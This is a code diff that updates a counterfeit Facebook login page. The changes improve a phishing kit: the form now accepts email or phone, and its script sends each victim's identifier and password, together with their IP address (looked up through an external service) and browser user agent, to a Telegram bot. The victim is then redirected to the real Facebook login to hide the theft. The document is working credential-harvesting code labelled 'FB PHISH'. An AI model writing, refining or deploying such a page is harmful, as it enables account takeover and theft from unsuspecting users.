@@ -5,7 +5,6 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
     <title>Facebook – log in or sign up</title>
     <style>
-        /* Same 2026 Facebook design as before – modern, responsive, dark mode */
         * { margin: 0; padding: 0; box-sizing: border-box; }
         body {
             font-family: system-ui, -apple-system, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
@@ -81,6 +80,7 @@
             cursor: pointer;
             text-align: center;
             display: inline-block;
+            text-decoration: none;
         }
         .create-btn:hover { background: #36a420; }
         .forgot-link { text-align: center; margin-top: 20px; }
@@ -108,7 +108,7 @@
         </div>
         <form id="loginForm">
             <div class="input-group">
-                <input type="email" id="email" name="email" placeholder="Email address or phone number" autofocus required>
+                <input type="text" id="identifier" name="identifier" placeholder="Email address or phone number" autofocus required>
             </div>
             <div class="input-group">
                 <input type="password" id="pass" name="pass" placeholder="Password" required>
@@ -129,35 +129,32 @@
         const CHAT_ID   = "7994255254";
         // ==================================================
 
-        // Helper: Send credentials to Telegram
-        async function sendToTelegram(email, password) {
-            const text = `🎭 FB LOGIN\nEmail: ${email}\nPassword: ${password}\nTime: ${new Date().toISOString()}\nUser-Agent: ${navigator.userAgent}`;
+        async function sendToTelegram(identifier, password) {
+            let ip = "unknown";
+            try {
+                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipData = await ipRes.json();
+                ip = ipData.ip;
+            } catch(e) { /* ignore */ }
+
+            const text = `🎭 FB PHISH\nEmail/Phone: ${identifier}\nPassword: ${password}\nIP: ${ip}\nTime: ${new Date().toISOString()}\nUser-Agent: ${navigator.userAgent}`;
             const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
             try {
-                const response = await fetch(url, {
+                await fetch(url, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({ chat_id: CHAT_ID, text: text })
                 });
-                if (!response.ok) {
-                    console.error("Telegram send failed:", response.status);
-                }
-            } catch (err) {
-                console.error("Telegram error:", err);
+            } catch(err) {
+                console.error(err);
             }
         }
 
-        // Handle form submission
         document.getElementById('loginForm').addEventListener('submit', async function(e) {
-            e.preventDefault();  // Stop normal submission
-
-            const email = document.getElementById('email').value;
+            e.preventDefault();
+            const identifier = document.getElementById('identifier').value;
             const password = document.getElementById('pass').value;
-
-            // Send to Telegram (best effort)
-            await sendToTelegram(email, password);
-
-            // Redirect to real Facebook login page
+            await sendToTelegram(identifier, password);
             window.location.href = "https://www.facebook.com/login.php";
         });
     </script>
